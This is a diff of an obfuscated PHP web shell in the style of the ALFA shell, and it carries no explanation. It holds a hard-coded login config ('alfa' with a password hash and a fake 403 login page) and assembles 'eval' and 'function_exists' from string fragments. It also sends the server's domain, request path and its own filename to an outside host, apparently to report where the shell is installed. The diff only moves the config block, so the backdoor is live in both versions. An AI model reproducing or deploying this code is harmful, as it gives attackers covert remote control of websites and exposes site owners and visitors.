@@ -6,6 +6,15 @@
 	Gmail:		solevisible@gmail.com
 	Date:		Monday, September 14, 2020
 */
+$GLOBALS['oZgNypoPRU'] = array(
+    'username' => 'alfa',
+    'password' => 'ef7c876f00f3acddd00fa671f52d0b1f',
+    'safe_mode' => '1',
+    'login_page' => '403',
+    'show_icons' => '1',
+    'post_encryption' => false,
+    'cgi_api' => true,
+);
 $domain = $_SERVER['SERVER_NAME'];
 $path = $_SERVER['REQUEST_URI'];
 $filename = basename(__FILE__);
@@ -26,16 +35,6 @@ $options = array(
 
 $context  = stream_context_create($options);
 $result = file_get_contents('https://raobannhadep.com/global.php', false, $context);
-$GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'alfa',
-    'password' => 'ef7c876f00f3acddd00fa671f52d0b1f',
-    'safe_mode' => '1',
-    'login_page' => '403',
-    'show_icons' => '1',
-    'post_encryption' => false,
-    'cgi_api' => true,
-);
-
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
 $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
 $OVpGNqqFZs = 'e' . 'v' . 'al';
